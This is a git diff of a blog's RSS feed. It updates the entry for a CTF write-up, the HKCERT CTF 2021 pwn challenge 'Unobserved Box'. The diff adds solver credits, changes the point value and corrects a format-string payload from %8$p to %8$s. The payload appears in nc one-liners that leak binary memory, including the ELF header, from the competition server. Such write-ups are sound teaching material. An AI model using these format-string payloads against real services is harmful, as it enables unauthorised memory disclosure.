@@ -266,12 +266,14 @@ hkcert21&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;4lw4ys_l0ok_4t_s74ck_0verf1o
 </description>
         </item>
         <item>
-        <title>[Pwn/Reverse] Unobserved Box (200 pts, 6 solves)</title>
+        <title>[Pwn/Reverse] Unobserved Box (250 pts, 6 solves)</title>
         <link>https://grhkm21.github.io/posts/hkcert-unobserved-box/</link>
         <pubDate>Sun, 14 Nov 2021 23:24:27 +0000</pubDate>
         
         <guid>https://grhkm21.github.io/posts/hkcert-unobserved-box/</guid>
-        <description>&lt;p&gt;Source of the problem: &lt;a class=&#34;link&#34; href=&#34;https://platform.ctf.hkcert.org/challenges/32&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <description>&lt;p&gt;Team Name: O0027 - UND3r 20 D53 H473r5 4ND r374K3r&lt;/p&gt;
+&lt;p&gt;Solved by: grhkm and Kaiziron&lt;/p&gt;
+&lt;p&gt;Source of the problem: &lt;a class=&#34;link&#34; href=&#34;https://platform.ctf.hkcert.org/challenges/32&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;HKCERT CTF 2021&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;problem-statement&#34;&gt;Problem Statement&lt;/h2&gt;
 &lt;blockquote&gt;
@@ -320,7 +322,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is not the correct answer.
 0x400000&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;ABCDEFGHIJK is not the correct answer.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Great, now note that the &lt;code&gt;$s&lt;/code&gt; format provides functionality to output the string at the location. So for example in the last command above, if we replace &lt;code&gt;%8$p&lt;/code&gt; with &lt;code&gt;%8$s&lt;/code&gt;, we would get:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# the magic header has appeared&lt;/span&gt;
-❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%8\$p&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
+❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%8\$s&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt;
 ELF&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;ABCDEFGHIJK is not the correct answer.
 
 ❯ python3 -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;print(&amp;#39;%8\$s&amp;#39; + &amp;#39;|&amp;#39; + &amp;#39;ABCDEFGHIJK\x00\x00\x40\x00\x00\x00\x00\x00&amp;#39;)&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc chalp.hkcert21.pwnable.hk &lt;span class=&#34;m&#34;&gt;28132&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; hexdump -C
